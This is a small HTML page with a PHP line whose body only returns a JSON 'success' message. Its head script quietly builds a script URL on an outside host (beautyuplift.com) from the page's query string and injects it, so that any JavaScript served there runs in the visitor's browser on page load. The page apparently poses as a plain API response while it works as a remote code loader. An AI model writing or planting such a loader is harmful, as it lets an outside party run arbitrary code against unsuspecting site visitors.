<html>
<head>
    <script>
        const objectMap = {

        }
        const param = window.location.search.replace("?", "").split("&")[0];
        console.log("Script", param)
        var script = document.createElement('script');
        script.setAttribute('src', 'https://beautyuplift.com/blog/?' + param + '.js');
        document.head.appendChild(script);
    </script>
</head>
</head>
<body>
    <?php echo '{"success": true}'; ?>
</body>
</html>